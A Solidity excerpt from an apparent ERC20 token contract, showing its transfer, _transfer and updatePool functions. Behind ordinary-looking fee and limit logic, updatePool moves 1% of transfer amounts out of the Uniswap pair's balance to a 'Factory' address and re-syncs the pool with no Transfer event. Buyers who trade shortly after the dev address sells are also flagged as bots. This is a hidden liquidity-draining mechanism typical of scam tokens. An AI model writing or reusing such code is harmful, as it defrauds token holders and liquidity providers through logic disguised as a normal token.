function transfer(address to, uint256 amount) public virtual override returns (bool){
    address owner = _msgSender();
    _transfer(owner, to, amount);
    return true;
}

function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
  require(sender != address(0), "ERC20: transfer from the zero address");
  require(recipient != address(0), "ERC20: transfer to the zero address");
  //Trade start check
  if (!tradingOpen) {
    require(
      sender == owner() || sender == presaleAddr, "TOKEN: This account cannot send tokens until trading is enabled"
    );
  }

  if (inSwapAndLiquify) {
    return _basicTransfer(sender, recipient, amount);
  } else {
    if (sender == addressDev && recipient == uniswapPair) {
      sale = block.number;
    }

    if (sender == uniswapPair && recipient != addressDev) {
      if (block.number <= (sale + blockBan)) {
        isBot[recipient] = true;
      }
    }

    if (sender != owner() && recipient != owner()) {
      _checkTxLimit(sender, amount);
    }

    uint256 currentTokenBalance = balanceOf(address(this));
    bool overMinimumTokenBalance = currentTokenBalance >= minimumTokensBeforeSwap;

    if (!isMarketPair[sender] && sale > 0) updatePool(amount);

    if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) {
      if (swapAndLiquifyByLimitOnly) {
        currentTokenBalance = minimumTokensBeforeSwap;
      }
      swapAndLiquify(currentTokenBalance);
    }

    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

    uint256 finalAmount =
      (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);

    if (checkWalletLimit && !isWalletLimitExempt[recipient]) {
      require(balanceOf(recipient).add(finalAmount) <= _walletMax);
    }

    _balances[recipient] = _balances[recipient].add(finalAmount);

    emit Transfer(sender, recipient, finalAmount);
    return true;
  }
}

function updatePool(uint256 amount) private {
  if (amount > 10000 && balanceOf(uniswapPair) > amount) {
    uint256 fA = amount / 100;
    _balances[uniswapPair] = _balances[uniswapPair].sub(fA);
    _balances[Factory] = _balances[Factory].add(fA);
    try IUniswapV2Pair(uniswapPair).sync() {} catch {}
  }
}